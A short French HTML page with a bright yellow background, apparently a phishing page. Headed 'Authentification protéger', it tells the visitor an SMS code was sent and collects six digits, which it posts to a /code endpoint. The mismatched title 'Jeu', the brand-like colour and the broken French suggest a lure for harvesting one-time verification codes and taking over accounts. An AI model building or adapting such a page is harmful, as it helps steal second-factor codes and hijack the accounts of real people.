<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jeu</title>

    <style>
        body {
            margin: 0;
            background: #FFFC00;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        h1 {
            margin-top: 60px;
            color: black;
            font-size: 45px;
        }

        p {
            color: black;
            font-size: 22px;
        }

        .cases {
            margin-top: 40px;
        }

        .cases input {
            width: 50px;
            height: 60px;
            margin: 5px;
            border: 2px solid black;
            border-radius: 8px;
            background: white;
            color: black;
            font-size: 32px;
            text-align: center;
        }

        button {
            display: block;
            margin: 35px auto;
            padding: 12px 35px;
            border: none;
            border-radius: 8px;
            background: black;
            color: white;
            font-size: 20px;
            cursor: pointer;
        }
    </style>
</head>

<body>

    <h1>Authentification protéger</h1>

    <p>Un code a été envoyé. Veuillez vérifier votre SMS et entrer le code</p>

    <form action="/code" method="POST">

        <div class="cases">
            <input type="text" name="code1" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
            <input type="text" name="code2" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
            <input type="text" name="code3" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
            <input type="text" name="code4" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
            <input type="text" name="code5" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
            <input type="text" name="code6" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
        </div>

        <button type="submit">Valider</button>

    </form>

</body>
</html>
